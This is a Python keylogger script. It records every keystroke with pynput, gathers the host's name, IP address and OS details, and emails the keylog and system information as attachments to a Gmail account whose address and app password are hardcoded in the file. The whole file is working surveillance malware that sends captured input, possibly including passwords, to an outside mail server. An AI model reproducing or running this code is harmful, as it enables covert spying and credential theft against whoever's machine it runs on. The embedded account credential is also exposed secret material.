import datetime
import time
import smtplib
import email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import pynput
from pynput.keyboard import Key, Listener
import socket
import platform
import os

# Function to clear the console
def clear():
    os.system('clear')

# Print ASCII art
print("""
 __        ___           _        ___  ___  ___ ___ _        ___          
| \    /\(  __ \|\     /|( \      (  _  )(  __ \(  __ \\_   _/( (    /|(  __ \         
|  \  / /| (    \/( \   / )| (      | (   ) || (    \/| (    \/   ) (   |  \  ( || (    \/         
|  (/ / | (_     \ (_) / | |      | |   | || |      | |         | |   |   \ | || |               
|   _ (  |  _)     \   /  | |      | |   | || | __ | | __    | |   | (\ \) || | ___          
|  ( \ \ | (         ) (   | |      | |   | || | \_  )| | \_  )   | |   | | \   || | \_  )         
|  /  \ \| (_/\   | |   | (_/\| (_) || (_) || (_) |_) (_| )  \  || (_) | _  _  _ 
|/    \/(__/   \/   (__/(__)(__)(__)\__/|/    ))(__)()()(_) 
""")

# Ask user if they want to start
verdict = input("Do you want to start? (y/n) ")
print('\n\n')

# Check user's choice
if verdict.lower() == "yes" or verdict.lower() == "y":
    clear()
    wait = input('Give the frequency of each mail in minutes: ')
    try:
        wait = float(wait)
    except ValueError:
        print('\nPlease enter an integer time value (minutes)')
        exit()

    print('\n\n')
    clear()

    email_id = "textmebro69@gmail.com"
    passd = "qwpmdtkmbrxbqyrk"

    try:
        test_mail = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)
        test_mail.starttls()
        test_mail.login(email_id, password=passd)
        test_mail.close()
    except Exception as e:
        print(f'\n\nError: {e}\nPlease check your username and/or password and try again!')
        exit()

    if "@gmail.com" not in email_id:
        print('\nPlease enter a valid @gmail.com email address')
        exit()

    print('\n')
    clear()
    print('Log started on: {}'.format(datetime.datetime.now().replace(microsecond=0)))
else:
    print('Hope to see you again! Goodbye!')
    exit()

password = passd

# Directory paths
dir_path = '{}/Logger'.format(os.path.expanduser('~'))

# Check if directory exists, if not, create it
if not os.path.isdir(dir_path):
    os.makedirs(dir_path)

# File paths
screenshot_path = '{}/Logger/screenshot.png'.format(os.path.expanduser('~'))
computer_information_path = '{}/Logger/computer_info.txt'.format(os.path.expanduser('~'))
keylog_path = '{}/Logger/log.txt'.format(os.path.expanduser('~'))

# Create empty files
with open(keylog_path, 'w') as file:
    file.write(' ')
with open(computer_information_path, 'w') as file:
    file.write(' ')

# Current time
now = datetime.datetime.now()
wait_time = float(wait)  # Minutes
send_time = now + datetime.timedelta(minutes=wait_time)

# Function to get computer information
def computer_information():
    host_name = socket.gethostname()
    IP = socket.gethostbyname(host_name)

    with open(computer_information_path, 'w') as file:
        file.write("\nSystem: {}, {}".format(platform.system(), platform.version()))
        file.write("\nProcessor: {}".format(platform.processor()))
        file.write("\nMachine: {}".format(platform.machine()))
        file.write("\nHost Name: {}".format(host_name))
        file.write("\nIP Address: {}".format(IP))

# Function to organize file
def organize_file(iteration_counter):
    if iteration_counter % 1 == 0:
        with open(keylog_path, 'w') as log:
            for key in all_keys:
                k = str(key).replace("'", "")
                if 'space' in k:
                    log.write('\n')
                elif 'shift' in k:
                    log.write('\n<<shift pressed>>\n')
                else:
                    log.write(k)
            log.close()

# Listener function for keyboard events
def on_press(key):
    global keys, count, all_keys
    keys.append(key)
    all_keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

# Write keys to file
def write_file(keys):
    global iterations
    with open(keylog_path, 'a') as log:
        for key in keys:
            iterations += 1
            try:
                if 'backspace' in str(key):
                    factored_key = all_keys[all_keys.index(key) - 2]
                    all_keys.pop(all_keys.index(key) - 1)
                    all_keys.pop(all_keys.index(key))
                else:
                    factored_key = all_keys[all_keys.index(key)]
                
                refined_key = str(factored_key).replace("'", "")
                if 'space' in refined_key:
                    log.write('\n')
                else:
                    log.write(refined_key)
            except IndexError:
                pass
        log.close()
        organize_file(iterations)

# Function to send email
def send_email(email_address, password):
    address_from = email_address
    address_to = email_address

    msg = MIMEMultipart()
    msg['From'] = address_from
    msg['To'] = address_to
    msg['Subject'] = "{}'s Log - {}".format(socket.gethostname(), datetime.datetime.now().replace(microsecond=0))

    body = "Please Find Attached: \na) Log.txt containing keylog of {}\nb) The User " \
           "information\n\nRegards,\nLogger".format(datetime.datetime.now().replace(microsecond=0))

    msg.attach(MIMEText(body, 'plain'))

    log_file = "log.txt"
    user_info_file = "UserInfo.txt"

    attachment_1 = MIMEApplication(open(keylog_path, 'rb').read(), _subtype='txt')
    attachment_1.add_header('Content-Disposition', "attachment; filename= %s" % log_file)
    msg.attach(attachment_1)

    attachment_3 = MIMEApplication(open(computer_information_path, 'rb').read(), _subtype='txt')
    attachment_3.add_header('Content-Disposition', "attachment; filename= %s" % user_info_file)
    msg.attach(attachment_3)

    mail = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)
    mail.starttls()
    mail.login(address_from, password=password)
    text = msg.as_string()
    mail.sendmail(address_from, address_to, text)
    mail.quit()

# Initialize global variables
count = 0
keys = []
all_keys = []
iterations = 0

# Listener for keyboard events
def on_release(key):
    if datetime.datetime.now() > send_time:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Send email
computer_information()
try:
    send_email(str(email_id), password=password)
except Exception as e:
    print('\nLog failed to send email at: {}\nError: {}'.format(datetime.datetime.now().replace(microsecond=0), e))

send_time = datetime.datetime.now() + datetime.timedelta(minutes=wait_time)

# One last send before program is stopped
computer_information()
try:
    send_email(str(email_id), password=password)
except Exception as e:
    print('\nLog failed to send email at: {}\nError: {}'.format(datetime.datetime.now().replace(microsecond=0), e))

print('\nLog ended on: {}'.format(datetime.datetime.now().replace(microsecond=0)))

